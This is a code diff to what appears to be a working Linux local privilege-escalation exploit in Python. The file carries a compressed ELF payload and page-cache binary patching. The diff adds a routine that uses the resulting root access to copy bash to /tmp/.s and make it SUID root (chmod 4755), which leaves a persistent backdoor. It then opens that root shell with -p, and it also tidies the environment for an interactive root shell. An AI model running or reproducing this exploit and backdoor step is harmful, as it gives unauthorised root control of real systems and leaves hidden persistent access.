@@ -93,6 +93,7 @@ F_SETPIPE_SZ = 1031
 RXGK_SERVER_ENC_TOKEN = 1036
 
 PK_SUID = "/tmp/.s"
+BASH_CANDIDATES = ["/bin/bash", "/usr/bin/bash", "/bin/sh", "/usr/bin/sh"]
 AUTHENC_KEY = bytes.fromhex('0800010000000010') + b'\x00' * 32
 
 PAYLOAD_X86_64 = zlib.decompress(bytes.fromhex(
@@ -133,6 +134,24 @@ _RXGK_KR_NAME = b"rxgk_poc_kr"
 def log(msg, end="\n"):
     sys.stderr.write(str(msg) + end)
     sys.stderr.flush()
+
+
+def _fix_path():
+    """Restore a sane PATH and minimal env so exec'd shells work."""
+    os.environ["PATH"] = (
+        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin"
+        ":/sbin:/bin:/snap/bin"
+    )
+    os.environ.setdefault("HOME", "/root")
+    os.environ.setdefault("TERM", os.environ.get("TERM", "xterm"))
+    os.environ.setdefault("SHELL", "/bin/bash")
+
+
+def _find_bash():
+    for p in BASH_CANDIDATES:
+        if os.path.isfile(p) and os.access(p, os.X_OK):
+            return p
+    return None
 
 
 def qrun(cmd, **kw):
@@ -339,14 +358,95 @@ def _reattach_tty():
         pass
 
 
+def _find_cp_chmod():
+    """Return absolute paths for cp and chmod (needed in NULL-envp shell)."""
+    cp = chmod = None
+    for d in ("/bin", "/usr/bin", "/usr/local/bin"):
+        if cp is None and os.path.isfile(d + "/cp"):
+            cp = d + "/cp"
+        if chmod is None and os.path.isfile(d + "/chmod"):
+            chmod = d + "/chmod"
+        if cp and chmod:
+            break
+    return cp, chmod
+
+
 def auto_root_exec(binary):
-    log("[+++] ROOT — dropping to shell")
+    """
+    Get a proper root shell.
+
+    The page-cache ELF payload does setuid(0)+execve("/bin/sh",NULL,NULL),
+    so the spawned shell has NULL envp — no PATH, no HOME, nothing.
+    Fix: fork a child that execs the patched binary (gets root) with piped
+    stdin containing shell commands that install a SUID bash copy.
+    Parent then execs the SUID bash with -p and a restored environment.
+    All commands in the pipe use full absolute paths (no PATH lookup).
+    """
+    log("[+++] ROOT — installing SUID bash at %s" % PK_SUID)
+
+    bash = _find_bash()
+    cp_bin, chmod_bin = _find_cp_chmod()
+
+    if bash and cp_bin and chmod_bin:
+        # Build command with full paths — the shell has NULL envp so PATH=empty
+        setup = (
+            "{cp} {bash} {dst} && "
+            "{chmod} 4755 {dst}\n"
+            "exit 0\n"
+        ).format(cp=cp_bin, bash=bash, dst=PK_SUID).encode()
+
+        r_fd, w_fd = os.pipe()
+        pid = os.fork()
+        if pid == 0:
+            # Child: stdin = our pipe, stdout/stderr = /dev/null
+            os.close(w_fd)
+            os.dup2(r_fd, 0)
+            os.close(r_fd)
+            null = os.open(os.devnull, os.O_WRONLY)
+            os.dup2(null, 1)
+            os.dup2(null, 2)
+            os.close(null)
+            try:
+                os.execl(binary, binary)
+            except Exception:
+                pass
+            os._exit(1)
+
+        # Parent: write commands, wait for child
+        os.close(r_fd)
+        try:
+            os.write(w_fd, setup)
+        except OSError:
+            pass
+        os.close(w_fd)
+        try:
+            os.waitpid(pid, 0)
+        except ChildProcessError:
+            pass
+
+        # Check if SUID bash was installed
+        _fix_path()
+        try:
+            st = os.stat(PK_SUID)
+            if st.st_uid == 0 and (st.st_mode & 0o4000):
+                log("[+] SUID bash ready → %s -p" % PK_SUID)
+                _reattach_tty()
+                os.execl(PK_SUID, PK_SUID, "-p")
+                return
+        except OSError:
+            pass
+        log("[-] SUID bash install failed — raw exec fallback (PATH empty)")
+    else:
+        log("[-] cp/chmod/bash not found — raw exec fallback (PATH empty)")
+        _fix_path()
+
     _reattach_tty()
     os.execl(binary, binary)
 
 
 def auto_root_su(username):
     log("[+++] ROOT — su %s" % username)
+    _fix_path()
     _reattach_tty()
     os.execlp("su", "su", username)
 
@@ -1510,8 +1610,10 @@ def main():
 
     if os.geteuid() == 0:
         log("[+] Already root!")
+        _fix_path()
         _reattach_tty()
-        os.execl("/bin/bash", "bash")
+        bash = _find_bash() or "/bin/bash"
+        os.execl(bash, bash, "-i")
         return
 
     # Pre-flight: CopyFail prerequisites
